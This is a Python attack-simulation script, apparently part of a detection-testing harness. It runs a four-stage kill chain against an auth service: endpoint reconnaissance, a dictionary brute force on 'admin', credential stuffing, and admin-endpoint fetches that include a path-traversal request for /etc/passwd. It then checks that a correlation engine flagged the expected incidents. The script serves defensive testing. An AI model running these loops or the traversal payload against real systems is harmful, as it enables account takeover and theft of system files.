"""
scenario_a.py — Attack Scenario A

Brute Force → Credential Compromise → Data Exfiltration (4 stages)

Stages
------
  1. Reconnaissance enumeration of auth endpoints.
  2. Dictionary brute force against a known account.
  3. Credential stuffing from a breach-style wordlist until success.
  4. Data exfiltration via sensitive admin endpoints using stolen session.

Expected kill-chain incidents (correlation engine)
  - brute_force_attempt
  - credential_compromise
  - data_exfiltration_risk
  - automated_attack_tool (optional — depends on timing)

MITRE ATT&CK: T1110, T1078, T1003, T1530, T1041
"""

from __future__ import annotations

import argparse
import time
from datetime import datetime

from attacker.common import (
    API_URL, AUTH_URL, Fore, SPEED_MAP,
    DetectionResult, add_speed_arg, log, req, reset_state,
    verify_detections,
)
from attacker import traffic_generator

TAG = "Scenario-A"

EXPECTED_INCIDENTS = [
    "brute_force_attempt",
    "credential_compromise",
    "data_exfiltration_risk",
]

PASSWORDS = [
    "123456", "password", "admin", "welcome", "letmein",
    "qwerty", "abc123", "monkey", "1234567", "dragon",
]

STUFFING_PAIRS = [
    ("alice",   "alice123"),
    ("bob",     "bobpass"),
    ("charlie", "charlie!"),
    ("diana",   "diana2024"),
    ("eve",     "eve@home"),
    ("john",    "password123"),  # seeded valid credential → triggers success
]

EXFIL_ENDPOINTS = [
    "/api/admin/config",
    "/api/admin/users/export",
    "/api/files?name=../../../etc/passwd",
]


def _stage_1_recon(d: float) -> dict:
    log(TAG, "Stage 1 — Auth endpoint reconnaissance", Fore.YELLOW)
    probes = ["/auth/status", "/auth/login", "/auth/register", "/auth/reset"]
    hits = 0
    for ep in probes:
        r = req("GET", f"{AUTH_URL}{ep}", timeout=2)
        if r is not None and r.status_code < 500:
            hits += 1
            log(TAG, f"  Probe {ep} [{r.status_code}]", Fore.CYAN)
        time.sleep(d * 0.3)
    return {"name": "auth_recon", "success": hits > 0, "detail": f"{hits}/{len(probes)} reachable"}


def _stage_2_brute_force(d: float) -> dict:
    log(TAG, "Stage 2 — Dictionary brute force against 'admin'", Fore.YELLOW)
    cracked = None
    for pwd in PASSWORDS:
        r = req(
            "POST",
            f"{AUTH_URL}/auth/login",
            json={"username": "admin", "password": pwd},
            timeout=3,
        )
        if r is None:
            continue
        data = {}
        try:
            data = r.json()
        except Exception:
            pass
        if data.get("status") == "success":
            cracked = pwd
            log(TAG, f"  ✅ admin:{pwd} — compromised", Fore.RED)
            break
        locked = "locked" in r.text.lower()
        log(TAG, f"  ❌ admin:{pwd} — {'LOCKED' if locked else 'failed'}", Fore.YELLOW)
        if locked:
            req("POST", f"{AUTH_URL}/auth/reset/admin", timeout=3)
        time.sleep(d)
    return {
        "name":    "brute_force",
        "success": cracked is not None,
        "detail":  f"tried {len(PASSWORDS)} passwords; cracked={'yes' if cracked else 'no'}",
    }


def _stage_3_stuffing(d: float) -> dict:
    log(TAG, "Stage 3 — Credential stuffing from breach wordlist", Fore.YELLOW)
    success = 0
    for username, password in STUFFING_PAIRS:
        r = req(
            "POST",
            f"{AUTH_URL}/auth/login",
            json={"username": username, "password": password},
            timeout=3,
        )
        status = "?"
        if r is not None:
            try:
                status = r.json().get("status", "?")
            except Exception:
                pass
        color = Fore.RED if status == "success" else Fore.YELLOW
        log(TAG, f"  {username}:{password} → {status}", color)
        if status == "success":
            success += 1
        time.sleep(d)
    return {
        "name":    "credential_stuffing",
        "success": success > 0,
        "detail":  f"{success}/{len(STUFFING_PAIRS)} credentials accepted",
    }


def _stage_4_exfiltration(d: float) -> dict:
    log(TAG, "Stage 4 — Data exfiltration via admin endpoints", Fore.RED)
    hits = 0
    for ep in EXFIL_ENDPOINTS:
        r = req("GET", f"{API_URL}{ep}", timeout=3)
        code = r.status_code if r is not None else "ERR"
        log(TAG, f"  Fetched {ep} [{code}]", Fore.RED)
        if r is not None and r.status_code < 500:
            hits += 1
        time.sleep(d)
    return {
        "name":    "data_exfiltration",
        "success": hits > 0,
        "detail":  f"accessed {hits}/{len(EXFIL_ENDPOINTS)} sensitive endpoints",
    }


def run(speed: str = "normal", noise: bool = False) -> dict:
    d = 0.4 * SPEED_MAP.get(speed, 1.0)
    result = DetectionResult(
        scenario="A — Brute Force → Credential Compromise → Data Exfiltration",
        start_time=datetime.now().isoformat(),
    )

    log(TAG, "═" * 60, Fore.CYAN)
    log(TAG, "Scenario A: 4-stage credential-access kill chain", Fore.CYAN)
    log(TAG, "═" * 60, Fore.CYAN)

    reset_state()
    time.sleep(2)

    def _execute() -> None:
        result.stages.append(_stage_1_recon(d))
        result.stages.append(_stage_2_brute_force(d))
        log(TAG, "Cooling — correlation window accumulation", Fore.CYAN)
        time.sleep(max(3.0, d * 4))
        result.stages.append(_stage_3_stuffing(d))
        result.stages.append(_stage_4_exfiltration(d))

    if noise:
        with traffic_generator.background(rate=2.0, verbose=True):
            _execute()
    else:
        _execute()

    verify_detections(result, EXPECTED_INCIDENTS, wait_seconds=5.0, tag=TAG)
    result.end_time = datetime.now().isoformat()
    return result.summary()


def main() -> None:
    parser = argparse.ArgumentParser(description="Scenario A: 4-stage credential kill chain")
    add_speed_arg(parser)
    args = parser.parse_args()
    summary = run(speed=args.speed, noise=args.noise)
    matched = len(summary.get("matched", []))
    expected = len(summary.get("expected", []))
    log(TAG, f"Result: {matched}/{expected} expected detections", Fore.MAGENTA)


if __name__ == "__main__":
    main()
